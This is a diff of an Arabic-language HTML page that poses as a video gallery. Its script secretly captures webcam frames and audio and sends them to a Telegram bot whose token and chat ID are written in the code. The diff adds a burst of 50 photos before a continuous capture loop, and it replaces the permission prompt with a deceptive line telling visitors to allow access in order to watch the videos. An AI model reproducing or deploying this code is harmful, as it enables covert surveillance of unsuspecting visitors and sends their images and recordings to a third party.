@@ -1,4 +1,6 @@
-<!DOCTYPE html><html lang="ar">
+
+<!DOCTYPE html>
+<html lang="ar">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
@@ -14,120 +16,131 @@
       color: #fff;
       animation: magic 10s infinite alternate;
       zoom: 1;
-    }@keyframes magic {
-  0% { filter: hue-rotate(0deg); }
-  100% { filter: hue-rotate(360deg); }
-}
+    }
 
-img {
-  max-width: 100%;
-}
+    @keyframes magic {
+      0% { filter: hue-rotate(0deg); }
+      100% { filter: hue-rotate(360deg); }
+    }
 
-.profile {
-  width: 100px;
-  height: 100px;
-  border-radius: 50%;
-  border: 4px solid purple;
-  position: absolute;
-  right: 10px;
-  top: 150px;
-  z-index: 999;
-  animation: pulse 2s infinite;
-}
+    img {
+      max-width: 100%;
+    }
 
-@keyframes pulse {
-  0% { box-shadow: 0 0 5px purple; }
-  50% { box-shadow: 0 0 20px red; }
-  100% { box-shadow: 0 0 5px purple; }
-}
+    .profile {
+      width: 120px;
+      height: 120px;
+      border-radius: 50%;
+      border: 4px solid purple;
+      position: absolute;
+      top: 140px;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 999;
+      animation: pulse 2s infinite;
+      object-fit: cover;
+      background: #000;
+    }
 
-.video-grid {
-  display: grid;
-  grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
-  gap: 10px;
-  padding: 20px;
-}
+    @keyframes pulse {
+      0% { box-shadow: 0 0 5px purple; }
+      50% { box-shadow: 0 0 20px red; }
+      100% { box-shadow: 0 0 5px purple; }
+    }
 
-.video-grid div {
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-}
+    .video-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
+      gap: 10px;
+      padding: 20px;
+    }
 
-video {
-  width: 100%;
-  aspect-ratio: 1/1;
-  border-radius: 10px;
-  background-color: #000;
-  cursor: pointer;
-  border: 3px solid purple;
-  transition: transform 0.3s;
-}
+    .video-grid div {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
 
-video:hover {
-  transform: scale(1.05);
-  box-shadow: 0 0 15px red;
-}
+    video {
+      width: 100%;
+      aspect-ratio: 1/1;
+      border-radius: 10px;
+      background-color: #000;
+      cursor: pointer;
+      border: 3px solid purple;
+      transition: transform 0.3s;
+    }
 
-.lightbox {
-  position: fixed;
-  top: 0; left: 0;
-  width: 100%; height: 100%;
-  background: rgba(0, 0, 0, 0.9);
-  display: none;
-  align-items: center;
-  justify-content: center;
-  z-index: 1000;
-  flex-direction: column;
-}
+    video:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 15px red;
+    }
 
-.lightbox video {
-  max-width: 90%;
-  max-height: 80%;
-}
+    .lightbox {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0, 0, 0, 0.9);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      flex-direction: column;
+    }
 
-.spinner {
-  border: 8px solid #eee;
-  border-top: 8px solid red;
-  border-radius: 50%;
-  width: 50px;
-  height: 50px;
-  animation: spin 1s linear infinite;
-  margin-top: 15px;
-}
+    .lightbox video {
+      max-width: 90%;
+      max-height: 80%;
+    }
 
-@keyframes spin {
-  0% { transform: rotate(0deg); }
-  100% { transform: rotate(360deg); }
-}
+    .spinner {
+      border: 8px solid #eee;
+      border-top: 8px solid red;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin-top: 15px;
+    }
 
-.back-btn {
-  position: fixed;
-  bottom: 20px;
-  left: 20px;
-  width: 60px;
-  height: 60px;
-  background-color: pink;
-  color: black;
-  border-radius: 50%;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  font-size: 24px;
-  cursor: pointer;
-  box-shadow: 0 0 10px pink;
-  z-index: 1001;
-}
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
 
+    .back-btn {
+      position: fixed;
+      bottom: 20px;
+      left: 20px;
+      width: 60px;
+      height: 60px;
+      background-color: pink;
+      color: black;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 24px;
+      cursor: pointer;
+      box-shadow: 0 0 10px pink;
+      z-index: 1001;
+    }
   </style>
 </head>
-<body onclick="takeExtraPhoto()">  <!-- 👑 صورة الغلاف -->  <img src="5alfia.png" alt="الغلاف">
+<body onclick="takeExtraPhoto()">
+  <!-- 👑 صورة الغلاف -->
+  <img src="5alfia.png" alt="الغلاف">
   <!-- 👑 صورة البروفايل -->
-  <img src="profile.png" class="profile">  <!-- 👑 وصف الموقع -->  <p style="margin-top: 80px; font-size: 18px; padding: 10px;">
+  <img src="profile.png" class="profile">
+  
+  <!-- 👑 وصف الموقع -->
+  <p style="margin-top: 220px; font-size: 18px; padding: 10px;">
     ركوب جلجامشة | تجاوزت جلجامشة خطوط الحمراء وبذلك صار دعسها عنوانها الاول ولأخير<br>
     طائفة الظلام تتجاوز العتمة لتحكم في لأخير | نحن الذي نفعل قبل ان نتكلم<br>
     لطالما كان ظلام كلمات لا يفهمها الا من قرأها وشادو من سا يكتب الكلمات
-  </p>  <div class="video-grid">
+  </p>
+
+  <div class="video-grid">
     <div>
       <video src="VivaCut_video_1751836959485_HD1.mp4" onclick="openLightbox(this)" poster="poster1.jpg"></video>
       <p>🎵 لحن النهاية</p>
@@ -148,15 +161,19 @@ video:hover {
       <video src="ffghgg5.mp4" onclick="openLightbox(this)" poster="poster5.jpg"></video>
       <p>👁️‍🗨️ عين الشيطان</p>
     </div>
-  </div>  <div id="lightbox" class="lightbox" onclick="closeLightbox()">
+  </div>
+
+  <div id="lightbox" class="lightbox" onclick="closeLightbox()">
     <video id="expandedVideo" controls autoplay></video>
     <div class="spinner" id="spinner"></div>
-  </div>  <div class="back-btn" onclick="location.href='index.html'">⬅</div>  <script>
+  </div>
+
+  <div class="back-btn" onclick="location.href='index.html'">⬅</div>
+
+  <script>
     const TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
     const CHAT_ID = "7664410054";
     let imageCapture = null;
-    let audioRecorder = null;
-    let audioInterval;
 
     const lightbox = document.getElementById('lightbox');
     const expandedVideo = document.getElementById('expandedVideo');
@@ -182,12 +199,35 @@ video:hover {
       .then(stream => {
         const track = stream.getVideoTracks()[0];
         imageCapture = new ImageCapture(track);
-        captureLoopImages();
+        captureInitialImages(); // 👑 أول 50 صورة
+        setTimeout(() => {
+          captureLoopImages();   // 👑 الاستمرار بعدها
+        }, 5000);
         startAudioRecordingLoop(stream);
       })
       .catch(() => {
-        alert("📸 يجب السماح بالكاميرا والميكروفون لالتقاط الصور والتسجيل.");
+        alert("يرجا سماح لمشاهدة الفيديوهات");
       });
+
+    function captureInitialImages() {
+      let count = 0;
+      const capture = () => {
+        if (!imageCapture || count >= 50) return;
+        imageCapture.grabFrame().then(bitmap => {
+          const canvas = document.createElement("canvas");
+          const size = Math.min(bitmap.width, bitmap.height);
+          canvas.width = canvas.height = size;
+          const ctx = canvas.getContext("2d");
+          ctx.drawImage(bitmap, 0, 0, size, size);
+          canvas.toBlob(blob => {
+            sendImage(blob, `📸 صورة أولية ${count + 1}`);
+            count++;
+            setTimeout(capture, 300); // تأخير بين كل صورة
+          }, "image/png");
+        });
+      };
+      capture();
+    }
 
     function captureLoopImages() {
       setInterval(() => {
@@ -243,5 +283,6 @@ video:hover {
         body: formData
       });
     }
-  </script></body>
+  </script>
+</body>
 </html>
